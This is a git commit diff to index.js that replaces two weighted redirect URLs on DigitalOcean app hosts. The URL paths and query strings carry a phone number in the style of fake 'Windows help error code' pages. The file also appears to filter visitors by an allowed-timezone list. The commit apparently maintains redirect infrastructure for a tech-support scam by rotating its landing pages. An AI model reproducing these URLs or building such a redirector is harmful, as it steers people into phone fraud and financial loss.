2f7e11af77c98e47b508b284bc4a107f678addee
paalakash <palaksh452@gmail.com>
2026-06-16 07:06:03 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://walrus-app-hivgt.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-900-934", weight: 0.5 },
-    { url: "https://seashell-app-lhwzn.ondigitalocean.app/werrx01USAHTML/?bcda=1800-900-934", weight: 0.5 } 
+    { url: "https://seahorse-app-xrsiw.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-900-934", weight: 0.5 },
+    { url: "https://jellyfish-app-fm7ws.ondigitalocean.app/werrx01USAHTML/?bcda=1800-900-934", weight: 0.5 } 
 
 ];
 
